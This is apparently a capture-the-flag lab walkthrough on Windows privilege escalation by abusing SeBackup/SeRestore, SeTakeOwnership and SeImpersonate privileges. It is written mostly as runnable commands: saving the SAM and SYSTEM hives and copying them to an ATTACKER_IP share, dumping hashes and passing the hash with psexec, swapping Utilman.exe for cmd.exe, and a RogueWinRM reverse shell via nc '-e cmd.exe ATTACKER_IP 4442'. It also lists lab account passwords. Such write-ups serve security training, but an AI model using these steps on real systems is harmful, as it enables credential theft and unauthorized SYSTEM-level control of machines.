# Windows Privilege Escalation: Abusing Dangerous Privileges

## Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can range from shutting down the machine to bypassing DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:

```bash
whoami /priv
```

A complete list of available privileges on Windows systems is available [here](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment). From an attacker's standpoint, only privileges that allow escalation are of interest. A comprehensive list of exploitable privileges can be found on the [Priv2Admin GitHub project](https://github.com/gtworek/Priv2Admin).

This guide showcases how to abuse some of the most common privileges.

---

## SeBackup / SeRestore

The `SeBackup` and `SeRestore` privileges allow users to read and write to any file in the system, ignoring any DACL in place. These privileges are typically used for system backups but can be exploited for privilege escalation.

### Steps to Exploit:

1. **Log in to the target machine**:
    - **User**: `THMBackup`
    - **Password**: `CopyMaster555`

    This account is part of the "Backup Operators" group, which has the `SeBackup` and `SeRestore` privileges.

2. **Open an elevated command prompt**:
    - Right-click and select "Run as administrator."
    - Input the password again to get an elevated console.

3. **Check privileges**:
    ```bash
    whoami /priv
    ```

4. **Backup the SAM and SYSTEM registry hives**:
    ```bash
    reg save hklm\system C:\Users\THMBackup\system.hive
    reg save hklm\sam C:\Users\THMBackup\sam.hive
    ```

5. **Transfer the files to the attacker machine**:
    - Start an SMB server on the attacker machine:
      ```bash
      mkdir share
      python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
      ```
    - Copy the files from the target machine:
      ```bash
      copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
      copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
      ```

6. **Extract password hashes**:
    ```bash
    python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
    ```

7. **Perform a Pass-the-Hash attack**:
    ```bash
    python3.9 /opt/impacket/examples/psexec.py -hashes <LMHASH>:<NTHASH> administrator@MACHINE_IP
    ```

---

## SeTakeOwnership

The `SeTakeOwnership` privilege allows a user to take ownership of any object on the system, including files and registry keys.

### Steps to Exploit:

1. **Log in to the target machine**:
    - **User**: `THMTakeOwnership`
    - **Password**: `TheWorldIsMine2022`

2. **Open an elevated command prompt**:
    - Right-click and select "Run as administrator."

3. **Check privileges**:
    ```bash
    whoami /priv
    ```

4. **Take ownership of `utilman.exe`**:
    ```bash
    takeown /f C:\Windows\System32\Utilman.exe
    ```

5. **Grant full permissions**:
    ```bash
    icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
    ```

6. **Replace `utilman.exe` with `cmd.exe`**:
    ```bash
    copy cmd.exe C:\Windows\System32\Utilman.exe
    ```

7. **Trigger the exploit**:
    - Lock the screen and click the "Ease of Access" button to open a SYSTEM-level command prompt.

---

## SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. They are commonly found in accounts like `LOCAL SERVICE` and `NETWORK SERVICE`.

### Steps to Exploit:

1. **Check privileges**:
    - Use a web shell or compromised account to confirm the privileges.

2. **Upload the RogueWinRM exploit**:
    - The exploit is pre-uploaded at `C:\tools\RogueWinRM\RogueWinRM.exe`.

3. **Start a reverse shell listener**:
    ```bash
    nc -lvp 4442
    ```

4. **Trigger the exploit**:
    ```bash
    C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
    ```

5. **Gain SYSTEM privileges**:
    - Wait for the reverse shell to connect:
      ```bash
      whoami
      nt authority\system
      ```